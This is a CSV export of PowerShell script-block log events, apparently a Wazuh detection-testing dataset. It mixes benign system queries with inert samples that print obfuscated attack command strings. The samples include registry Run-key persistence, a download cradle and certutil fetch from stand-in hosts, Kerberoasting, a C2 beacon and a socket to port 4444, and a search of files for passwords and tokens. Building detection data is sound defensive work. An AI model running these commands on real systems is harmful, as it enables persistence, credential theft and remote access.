sample_id,declared_sample_id,mapping_status,source_line,channel,provider_name,computer,record_id,time_created_utc,event_id,scriptblock_id,message_number,message_total,dataset_fidelity_status,scriptblock_sha256,scriptblock_text
PST-279,PST-279,mapped,279,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723787,2026-07-17T09:37:42.5122289Z,4104,1d89f176-ad28-4f30-afd4-547a0abbe706,1,1,exact,f86f63e142a906a70cef14a0ba003a1014196a43afbe708935ecdffebc13f6f8,"$sampleId='PST-279'; Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, BuildNumber; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-280,PST-280,mapped,280,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723792,2026-07-17T09:37:43.0231274Z,4104,123c056e-8680-4234-a566-557d6ebb65ab,1,1,exact,5ec3b18c8f5841c2b56ad4772013500111ca65fb9fa09dac940731a336176d00,"$sampleId='PST-280'; Get-LocalUser -ErrorAction SilentlyContinue | Select-Object -First 5 Name, Enabled; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-281,PST-281,mapped,281,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723808,2026-07-17T09:37:43.3678898Z,4104,8d511cfb-162e-486e-8370-df15ccade71a,1,1,exact,0e1cd51941f24fb36d6b6506bd2f0485bcdfd21820ebc6203a7564438aedc0cf,"$sampleId='PST-281'; $indicator='New-ItemProperty -Path ''HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'' -Name ''UpdateCheck'' -Value ''powershell.exe -WindowStyle Hidden -File C:\__THESIS_INERT__\stage.ps1'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-282,PST-282,mapped,282,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723809,2026-07-17T09:37:43.6993616Z,4104,d6774af6-ba7b-4fe7-b4ca-870675cddb06,1,1,exact,79753cc5856db86e8b3f3541df1a38c800e587f4afe8b0ec128f331af44fe7a9,"$sampleId='PST-282'; $parts=@('Invoke-K','erberoa','st -O','utput','Format H','ashcat | Se','lect-Obj','ect SamAcc','ountN','ame,Hash'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-283,PST-283,mapped,283,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723811,2026-07-17T09:37:44.0240396Z,4104,cf0df548-47e3-4467-8fe6-9cc1f0ac9b0f,1,1,exact,2f43524ea8552164429ba8f0f9c5174db438577477deac9b50441bf11da00325,"$sampleId='PST-283'; $parts=@('$profilE=@{S','lEep=60000',';JIttEr=0.25;Us','ERAgent=''','moZilLa/5.0'';u','Ri=''/aPi/V1/','Stat`us''};',' INV`OkE-webrEQ','uEsT -uRi ''hTT','pS://C2.EXa','MplE.InvaL`','ID/aPi/V1/StA`Tu','s'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-284,PST-284,mapped,284,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723814,2026-07-17T09:37:44.3635165Z,4104,a14cce52-eefb-4f70-a61a-e0c4b8c98b5f,1,1,exact,70242871fd5dfdf46cc9f34e2c70c3b5ad4fd5e2546e974cff421dbd4a872ccf,"$sampleId='PST-284'; [xml]'<config><mode>audit</mode></config>' | Select-Object -ExpandProperty config; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-285,PST-285,mapped,285,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723818,2026-07-17T09:37:44.7018320Z,4104,a869047f-6f9a-4138-a0de-4bca8d3e853b,1,1,exact,2cc7936a2b4383b5a7254505f6e167e95aefff2f4ade88199b1faefa7c28b52d,"$sampleId='PST-285'; Get-WinEvent -LogName System -MaxEvents 5 | Select-Object Id, ProviderName, TimeCreated; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-286,PST-286,mapped,286,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723820,2026-07-17T09:37:45.0469829Z,4104,2817bd7e-6a85-401c-b602-a1c0473fb513,1,1,exact,28a980861901f1c456d8ab1f254d65f2faa33954402d15cd8fad3273b8717534,"$sampleId='PST-286'; $parts=@('IEX (Ne','w-Obj','ect Net.W','ebClient',').DownloadSt','ring(''','https:','//stag','e.example.inv','alid/bootstr','ap.ps1'')'); $indicator=[string]::Concat($parts); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-287,PST-287,mapped,287,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723823,2026-07-17T09:37:45.3817867Z,4104,7706f2bf-5835-4104-b760-e6fc02158fe6,1,1,exact,103db3aa98a92b8a1cbe8429866e05d8e07b96107ca5854770c3966529a7bd6d,"$sampleId='PST-287'; $indicator='Invoke-WebRequest -Uri ''https://files.example.invalid/update.bin'' -OutFile ''$env:TEMP\update.bin'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-288,PST-288,mapped,288,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723826,2026-07-17T09:37:45.7096521Z,4104,482463a4-a3c3-4bd9-b16c-4240389b22eb,1,1,exact,9014314d2ffb3cad41ff84a174deb40c54dbe51acc3d9a7cf1cd43a2de3bb20c,"$sampleId='PST-288'; Get-Printer -ErrorAction SilentlyContinue | Select-Object -First 5 Name, DriverName; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-289,PST-289,mapped,289,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723841,2026-07-17T09:37:46.0579241Z,4104,a0c76815-84a6-414f-b133-4ed34f69bbc6,1,1,exact,d4ef2d04aa485a5e6771a761f7ce937864e95ca7ef63e51b8308d8bfadf6a608,"$sampleId='PST-289'; Get-CimInstance Win32_QuickFixEngineering | Select-Object -First 5 HotFixID, Description; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-290,PST-290,mapped,290,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723871,2026-07-17T09:37:48.8972203Z,4104,6498da8f-a9dc-4fe8-b1a7-28a0844b8e95,1,1,exact,de461ed745b36fcb7f3ca58ae3b4fb284dcec4c0973166ae6a8135c42838982e,"$sampleId='PST-290'; Get-DnsClientCache -ErrorAction SilentlyContinue | Select-Object -First 5 Entry, Data; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-291,PST-291,mapped,291,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723875,2026-07-17T09:37:49.2476910Z,4104,003c2d18-73d3-489a-b6b6-ebecd718ecfa,1,1,exact,b2a736170ed13651c4484b05fc3e6d60348dba6ed62c37e3d81e0e089cea74b0,"$sampleId='PST-291'; Get-Process | Select-Object -First 5 Name, Id, CPU; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-292,PST-292,mapped,292,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723891,2026-07-17T09:37:49.5995160Z,4104,6d2e130e-0a34-4192-b050-e165e33a2ce4,1,1,exact,4f6043852de0100aab1c6305bb75801e5e942e9e708c9bdede899dce6fb2b5a9,"$sampleId='PST-292'; $cfg = 'path=C:\Temp;mode=audit;owner=admin;enabled=true;retry=3;hash=AA11-BB22-CC33'; Write-Output $cfg; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-293,PST-293,mapped,293,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723893,2026-07-17T09:37:50.1870110Z,4104,a47212be-7653-431a-95b9-ba5ca16ce492,1,1,exact,c72aea2501c6e903d8b5311807d4492ef0c92a228935ecf2e33a4b43cb6f0195,"$sampleId='PST-293'; $indicator='$cl`ient=New-Object Sy`stem.Net.Sockets.TcpClient(''203.0.113.77'',4444); $stre`am=$cl`ient.GetStr`eam(); $bu`ffer=New-Obje`ct byte[] 4096; $read=$stream.Read($bu`ffer,0,$buffer.Length)'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-294,PST-294,mapped,294,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723898,2026-07-17T09:37:50.5068965Z,4104,2557d382-b63e-4d44-9e4d-cd84d7872218,1,1,exact,b8ce8c3571fb02b8c7b8d788496991c29d0a3d6904ebfebf44ddf19f17fbc382,"$sampleId='PST-294'; $parts=@('In`VOK','e-wEbrE','queST -','uRi ''HtTpS:','//fILes.','exampLE.i','NvalI','D/upd`','ate.bIN',''' -oUtfi`Le ''$','eNv:tEmP\uP','da`Te.BI','n'''); $indicator=($parts -join ''); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-295,PST-295,mapped,295,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723903,2026-07-17T09:37:50.8386546Z,4104,b0f95b2b-fce1-427a-b993-eb7e4b7bb01b,1,1,exact,fe34c339ba2a0ac04d06daf7b4232d938037ca0882a964c1aa50138c3d10fdba,"$sampleId='PST-295'; Get-ExecutionPolicy -List; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-296,PST-296,mapped,296,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723906,2026-07-17T09:37:51.1771853Z,4104,26fb289d-451e-46ef-b483-072660014997,1,1,exact,8c7657a7bd61c01136d6989b08a56a2f039e7ccbee5e3ac3b46f0e93d37cfcd4,"$sampleId='PST-296'; $indicator='certutil.exe -urlcach' + 'e -split -f ht' + 'tps://cert.examp' + 'le.invalid/blob.txt' + ' C:\__THESIS_INERT__' + '\blob.txt; certutil' + '.exe -decode C:' + '\__THESIS_INERT' + '__\blob.txt C:\__T' + 'HESIS_INERT__\stage.b' + 'in'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-297,PST-297,mapped,297,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723920,2026-07-17T09:37:51.5145260Z,4104,06e6ac25-e153-40c9-8367-be89a6f52d68,1,1,exact,67c36b120c859f6ba93612b08fdf4a925195a2afbde44dd66e4c2e9587875610,"$sampleId='PST-297'; $encoded='TgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACcASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4AJwAgAC0ATgBhAG0AZQAgACcAVQBwAGQAYQB0AGUAQwBoAGUAYwBrACcAIAAtAFYAYQBsAHUAZQAgACcAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0ARgBpAGwAZQAgAEMAOgBcAF8AXwBUAEgARQBTAEkAUwBfAEkATgBFAFIAVABfAF8AXABzAHQAYQBnAGUALgBwAHMAMQAnAA=='; $indicator=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)); Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-298,PST-298,mapped,298,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723923,2026-07-17T09:37:51.8469976Z,4104,c96e28de-181b-4d8e-90f4-79cb32eb1001,1,1,exact,acf086b7ab2faa571a3449e212f9cc17d288b2d71665da0861c5399552541690,"$sampleId='PST-298'; Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue | Select-Object -First 5 Name; Write-Output 'benign variant 2'; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-299,PST-299,mapped,299,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723928,2026-07-17T09:37:52.1906934Z,4104,148d35f5-f2e4-4466-9b96-b5f246b7a485,1,1,exact,f931e47e5b3ef627aa69f449d823446436105a1800a3c8a83373fa8737461d3d,"$sampleId='PST-299'; $indicator='get-chiLdIteM -PATH ''C:\uSerS'' -rECurse -inClUdE ''*.ConFig'',''*.xML'' | SELeCT-STrING -pATTERn ''PaSsWord|tokEn|sEcRET'''; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
PST-300,PST-300,mapped,300,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-PowerShell,,723930,2026-07-17T09:37:52.5168606Z,4104,1fbac975-d49d-491f-88a9-92a315947fcd,1,1,exact,7f56b832c88a79a4cb205db36bc802da1462515890d3b02f18f5cc4aeedad057,"$sampleId='PST-300'; $indicator='$client=New-Object' + ' System.Net.Soc' + 'kets.TcpClient(''' + '203.0.113.77'',4444)' + '; $stream=$client' + '.GetStream(); $buffe' + 'r=New-Object byte[]' + ' 4096; $read=$s' + 'tream.Read($buf' + 'fer,0,$buffer.Length' + ')'; Write-Output $indicator; Write-Output (""WAZUH_SAMPLE {0}"" -f $sampleId)"
